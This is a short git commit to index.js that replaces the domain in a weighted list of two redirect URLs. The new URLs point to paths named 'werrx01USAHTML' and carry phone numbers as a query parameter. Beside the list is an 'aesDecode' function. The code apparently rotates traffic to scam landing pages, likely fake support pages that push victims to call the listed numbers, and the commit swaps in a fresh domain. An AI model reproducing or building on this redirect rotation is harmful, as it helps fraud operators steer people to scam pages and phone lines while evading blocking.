43a12b97f261a5f7a8e6cee113ad0bb2eb7c2c5c
animalinside <akshay.anand12@yahoo.com>
2026-05-27 07:19:44 +0530

    Update index.js

--- index.js
+++ index.js
@@ -72,8 +72,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://Style-Nest.on-forge.com/werrx01USAHTML/?bcda=800 852 3109", weight: 0.5 },
-        { url: "https://Style-Nest.on-forge.com/werrx01USAHTML/?bcda=+65-653-106-3088", weight: 0.5 }
+        { url: "https://Elvora--.on-forge.com/werrx01USAHTML/?bcda=800 852 3109", weight: 0.5 },
+        { url: "https://Elvora--.on-forge.com/werrx01USAHTML/?bcda=+65-653-106-3088", weight: 0.5 }
       
     ];
 
